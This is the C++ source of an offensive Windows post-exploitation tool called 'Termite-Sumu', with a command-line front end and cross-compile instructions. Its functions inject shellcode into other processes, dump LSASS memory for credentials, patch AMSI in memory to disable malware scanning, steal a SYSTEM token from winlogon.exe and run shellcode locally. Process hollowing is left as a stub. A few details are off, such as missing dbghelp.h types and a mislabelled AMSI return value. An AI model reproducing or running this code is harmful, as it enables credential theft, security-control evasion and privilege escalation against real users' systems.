/*
 * Termite-Sumu — C++ Native Windows Exploitation Engine
 *
 * This module provides direct Win32 API access that Python cannot reach:
 *   - Process injection (CreateRemoteThread + VirtualAllocEx)
 *   - Token manipulation (OpenProcessToken, DuplicateTokenEx)
 *   - LSASS memory dumping (MiniDumpWriteDump)
 *   - AMSI in-memory patching
 *   - Shellcode execution via executable memory allocation
 *
 * BUILD (cross-compile from Kali):
 *   x86_64-w64-mingw32-g++ -std=c++17 -O2 -s -static
 *       -o bin/injector.exe src/injector.cpp
 *       -ladvapi32 -luser32
 *
 * USAGE:
 *   injector.exe <technique> <PID> [shellcode.bin]
 *     technique: inject | hollow | dump | amsi | token | exec
 *
 * Author: C7aWL3R | archnexus707
 */

#ifndef TERMITE_NATIVE_H
#define TERMITE_NATIVE_H

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <iostream>
#include <vector>
#include <string>
#include <cstdint>

namespace termite {

// ── 1. Classic CreateRemoteThread Injection (T1055.001) ──────────────────
bool inject_shellcode(DWORD pid, const std::vector<uint8_t>& shellcode) {
    HANDLE hProcess = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE |
        PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProcess) {
        std::cerr << "[!] OpenProcess failed: " << GetLastError() << "\n";
        return false;
    }

    LPVOID remoteMem = VirtualAllocEx(hProcess, nullptr, shellcode.size(),
                                       MEM_COMMIT | MEM_RESERVE,
                                       PAGE_EXECUTE_READWRITE);
    if (!remoteMem) {
        std::cerr << "[!] VirtualAllocEx failed: " << GetLastError() << "\n";
        CloseHandle(hProcess);
        return false;
    }

    SIZE_T written = 0;
    if (!WriteProcessMemory(hProcess, remoteMem, shellcode.data(),
                            shellcode.size(), &written)) {
        std::cerr << "[!] WriteProcessMemory failed: " << GetLastError() << "\n";
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0,
        (LPTHREAD_START_ROUTINE)remoteMem, nullptr, 0, nullptr);
    if (!hThread) {
        std::cerr << "[!] CreateRemoteThread failed: " << GetLastError() << "\n";
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    std::cout << "[+] Shellcode injected into PID " << pid
              << " (" << shellcode.size() << " bytes)\n";
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    return true;
}

// ── 2. Process Hollowing (T1055.012) ─────────────────────────────────────
bool process_hollow(DWORD pid, const std::vector<uint8_t>& payload) {
    // Placeholder — full implementation requires:
    // 1. CreateProcess(CREATE_SUSPENDED) of legitimate binary
    // 2. NtUnmapViewOfSection to hollow original image
    // 3. VirtualAllocEx for new PE base
    // 4. WriteProcessMemory for headers + sections
    // 5. SetThreadContext to point entry to new EP
    // 6. ResumeThread
    std::cerr << "[!] Process hollowing not yet implemented in stub\n";
    return false;
}

// ── 3. LSASS Memory Dump (T1003.001) ────────────────────────────────────
bool dump_lsass(const std::string& outPath) {
    // Find LSASS PID
    DWORD lsassPid = 0;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return false;

    PROCESSENTRY32W pe = { sizeof(pe) };
    if (Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, L"lsass.exe") == 0) {
                lsassPid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);

    if (!lsassPid) {
        std::cerr << "[!] LSASS process not found\n";
        return false;
    }

    // Enable SeDebugPrivilege
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        std::cerr << "[!] OpenProcessToken failed — run as Administrator\n";
        return false;
    }

    LUID luid;
    LookupPrivilegeValueW(nullptr, SE_DEBUG_NAME, &luid);
    TOKEN_PRIVILEGES tp = { 1, { luid, SE_PRIVILEGE_ENABLED } };
    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), nullptr, nullptr);
    CloseHandle(hToken);

    HANDLE hProcess = OpenProcess(
        PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, lsassPid);
    if (!hProcess) {
        std::cerr << "[!] OpenProcess(LSASS) failed: " << GetLastError() << "\n";
        return false;
    }

    HANDLE hFile = CreateFileA(outPath.c_str(), GENERIC_WRITE, 0, nullptr,
                                CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) {
        std::cerr << "[!] CreateFile failed: " << GetLastError() << "\n";
        CloseHandle(hProcess);
        return false;
    }

    // MiniDumpWriteDump — requires dbghelp.dll (loaded dynamically)
    using MiniDumpWriteDump_t = BOOL(WINAPI*)(HANDLE, DWORD, HANDLE, int,
        PMINIDUMP_EXCEPTION_INFORMATION, PMINIDUMP_USER_STREAM_INFORMATION,
        PMINIDUMP_CALLBACK_INFORMATION);
    HMODULE dbghelp = LoadLibraryA("dbghelp.dll");
    if (!dbghelp) {
        std::cerr << "[!] dbghelp.dll not found\n";
        CloseHandle(hFile); CloseHandle(hProcess);
        return false;
    }
    auto pMiniDump = reinterpret_cast<MiniDumpWriteDump_t>(
        GetProcAddress(dbghelp, "MiniDumpWriteDump"));
    if (!pMiniDump) {
        std::cerr << "[!] MiniDumpWriteDump not found\n";
        CloseHandle(hFile); CloseHandle(hProcess);
        return false;
    }

    BOOL ok = pMiniDump(hProcess, lsassPid, hFile,
                        2 /* MiniDumpWithFullMemory */,
                        nullptr, nullptr, nullptr);
    CloseHandle(hFile);
    CloseHandle(hProcess);

    if (ok) {
        std::cout << "[+] LSASS dumped to " << outPath << "\n";
    } else {
        std::cerr << "[!] MiniDumpWriteDump failed: " << GetLastError() << "\n";
    }
    return ok;
}

// ── 4. AMSI In-Memory Patch (T1562.001) ─────────────────────────────────
bool patch_amsi() {
    // Patch AmsiScanBuffer in amsi.dll to always return AMSI_RESULT_CLEAN
    HMODULE amsi = LoadLibraryA("amsi.dll");
    if (!amsi) {
        std::cerr << "[!] amsi.dll not loaded\n";
        return false;
    }

    FARPROC pAmsiScanBuffer = GetProcAddress(amsi, "AmsiScanBuffer");
    if (!pAmsiScanBuffer) {
        std::cerr << "[!] AmsiScanBuffer not found\n";
        return false;
    }

    // The patch: mov eax, 0x80070057; ret
    // AMSI_RESULT_CLEAN = 0x80070057 (E_INVALIDARG but treated as clean)
    uint8_t patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };

    DWORD oldProtect;
    if (!VirtualProtect(pAmsiScanBuffer, sizeof(patch),
                        PAGE_EXECUTE_READWRITE, &oldProtect)) {
        std::cerr << "[!] VirtualProtect failed: " << GetLastError() << "\n";
        return false;
    }

    memcpy(pAmsiScanBuffer, patch, sizeof(patch));
    VirtualProtect(pAmsiScanBuffer, sizeof(patch), oldProtect, &oldProtect);

    std::cout << "[+] AMSI patched — PowerShell scripts will not be scanned\n";
    return true;
}

// ── 5. Token Stealing (T1134.001) ───────────────────────────────────────
bool steal_system_token() {
    // Find a SYSTEM process (winlogon.exe typically runs as SYSTEM)
    DWORD systemPid = 0;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return false;

    PROCESSENTRY32W pe = { sizeof(pe) };
    if (Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, L"winlogon.exe") == 0) {
                systemPid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);

    if (!systemPid) {
        std::cerr << "[!] winlogon.exe not found\n";
        return false;
    }

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, systemPid);
    if (!hProcess) {
        std::cerr << "[!] OpenProcess(winlogon) failed: " << GetLastError() << "\n";
        return false;
    }

    HANDLE hToken;
    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY |
                                    TOKEN_QUERY, &hToken)) {
        std::cerr << "[!] OpenProcessToken failed: " << GetLastError() << "\n";
        CloseHandle(hProcess);
        return false;
    }

    HANDLE hDupToken;
    if (!DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, nullptr,
                          SecurityImpersonation, TokenPrimary, &hDupToken)) {
        std::cerr << "[!] DuplicateTokenEx failed: " << GetLastError() << "\n";
        CloseHandle(hToken); CloseHandle(hProcess);
        return false;
    }

    if (!ImpersonateLoggedOnUser(hDupToken)) {
        std::cerr << "[!] ImpersonateLoggedOnUser failed: " << GetLastError() << "\n";
        CloseHandle(hDupToken); CloseHandle(hToken); CloseHandle(hProcess);
        return false;
    }

    std::cout << "[+] Successfully impersonated SYSTEM token from winlogon.exe\n";
    CloseHandle(hDupToken); CloseHandle(hToken); CloseHandle(hProcess);
    return true;
}

// ── 6. Shellcode Runner via Heap Exec ────────────────────────────────────
bool exec_shellcode(const std::vector<uint8_t>& shellcode) {
    LPVOID execMem = VirtualAlloc(nullptr, shellcode.size(),
                                   MEM_COMMIT | MEM_RESERVE,
                                   PAGE_EXECUTE_READWRITE);
    if (!execMem) {
        std::cerr << "[!] VirtualAlloc failed: " << GetLastError() << "\n";
        return false;
    }

    memcpy(execMem, shellcode.data(), shellcode.size());

    auto fn = reinterpret_cast<void(*)()>(execMem);
    fn();

    VirtualFree(execMem, 0, MEM_RELEASE);
    return true;
}

} // namespace termite

// ── CLI Entry Point ───────────────────────────────────────────────────────
int main(int argc, char* argv[]) {
    if (argc < 2) {
        std::cout << "Termite-Sumu Native Engine v1.0\n"
                  << "Usage: injector.exe <technique> [args...]\n\n"
                  << "Techniques:\n"
                  << "  inject <PID> <shellcode.bin>  — CreateRemoteThread\n"
                  << "  hollow  <PID> <payload.exe>    — Process Hollowing\n"
                  << "  dump    <output.dmp>           — LSASS memory dump\n"
                  << "  amsi                            — AMSI in-memory patch\n"
                  << "  token                           — Steal SYSTEM token\n"
                  << "  exec    <shellcode.bin>         — Run shellcode in self\n";
        return 1;
    }

    std::string technique = argv[1];

    if (technique == "inject" && argc >= 4) {
        DWORD pid = std::stoul(argv[2]);
        // Read shellcode from file
        HANDLE hFile = CreateFileA(argv[3], GENERIC_READ, 0, nullptr,
                                    OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hFile == INVALID_HANDLE_VALUE) {
            std::cerr << "[!] Cannot open shellcode file: " << argv[3] << "\n";
            return 1;
        }
        DWORD size = GetFileSize(hFile, nullptr);
        std::vector<uint8_t> sc(size);
        DWORD read;
        ReadFile(hFile, sc.data(), size, &read, nullptr);
        CloseHandle(hFile);
        return termite::inject_shellcode(pid, sc) ? 0 : 1;
    }

    if (technique == "hollow" && argc >= 4) {
        std::cerr << "[!] Process hollowing — stub not implemented yet\n";
        return 1;
    }

    if (technique == "dump" && argc >= 3) {
        return termite::dump_lsass(argv[2]) ? 0 : 1;
    }

    if (technique == "amsi") {
        return termite::patch_amsi() ? 0 : 1;
    }

    if (technique == "token") {
        return termite::steal_system_token() ? 0 : 1;
    }

    if (technique == "exec" && argc >= 3) {
        HANDLE hFile = CreateFileA(argv[2], GENERIC_READ, 0, nullptr,
                                    OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hFile == INVALID_HANDLE_VALUE) {
            std::cerr << "[!] Cannot open: " << argv[2] << "\n";
            return 1;
        }
        DWORD size = GetFileSize(hFile, nullptr);
        std::vector<uint8_t> sc(size);
        DWORD read;
        ReadFile(hFile, sc.data(), size, &read, nullptr);
        CloseHandle(hFile);
        return termite::exec_shellcode(sc) ? 0 : 1;
    }

    std::cerr << "[!] Unknown technique or missing arguments\n";
    return 1;
}
